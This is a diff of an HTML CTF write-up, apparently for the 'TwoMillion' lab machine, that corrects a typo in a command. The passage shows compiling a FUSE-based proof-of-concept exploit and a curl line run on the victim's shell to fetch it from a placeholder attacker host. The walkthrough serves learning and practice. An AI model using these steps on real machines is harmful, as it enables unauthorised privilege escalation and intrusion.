@@ -330,7 +330,7 @@ Which eventually after some time, the tool provided a comprehensive system enume
 <li><code>gcc poc.c -o poc -D_FILE_OFFSET_BITS=64 -static -lfuse -ldl</code> | compliation to statically linked executable, allowing large file support, linking against FUSE and dynamic <code>libfuse</code> loading</li>
 </ul>
 <p>Then a local python server was locally ran on port 9000, for the download of the exploit on the victim machine with the use of <code>curl</code>.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -O http://1&lt;attacker_ip&gt;:9000/poc
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -O http://&lt;attacker_ip&gt;:9000/poc
 </span></span></code></pre></div><h5 id="note-command-used-on-the-victim"><em>Note: Command used on the victim&rsquo;s shell</em></h5>
 <p align="center">
   <img src="/captures/screens/TwoMillion/shot-023.png" alt="shot-023">
